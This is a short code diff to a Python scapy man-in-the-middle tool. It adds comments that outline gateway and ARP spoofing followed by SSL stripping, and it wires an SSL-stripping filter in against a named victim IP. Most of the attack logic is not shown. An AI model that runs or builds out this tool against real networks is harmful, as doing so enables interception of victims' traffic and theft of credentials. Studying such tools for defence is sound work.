@@ -1,10 +1,20 @@
+# Spoof gateway
+# Listen for request from client
+# do either ARP if server on local network, otherwise gateway is already spoofed
+# Complete tcp handshake
+# Wait for http
+# If ssl stripping, start http connection using ssl stripping
+# If not, just start https connection
+
 import scapy.all as sc
 import threading
 from scapy.layers.inet import IP, TCP, UDP
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import Ether
+from SSLFilter import SSLStripFilter
 
 class MitmHandler:
+
     
     def __init__(self, interface, gateway_ip, victim_ip, attacker_mac, attacker_ip, attacker_ipv6, logger):
         self.interface = interface
@@ -18,6 +28,7 @@ class MitmHandler:
         self.running = False
         self.logger = logger
         self.filters = []
+        self.add_filter(SSLStripFilter(self.victim_ip, self.logger))
 
     def add_filter(self, filter_handler):
         self.filters.append(filter_handler)
@@ -135,4 +146,3 @@ class MitmHandler:
 
         except Exception as e:
             self.logger(f"{e}")
-        
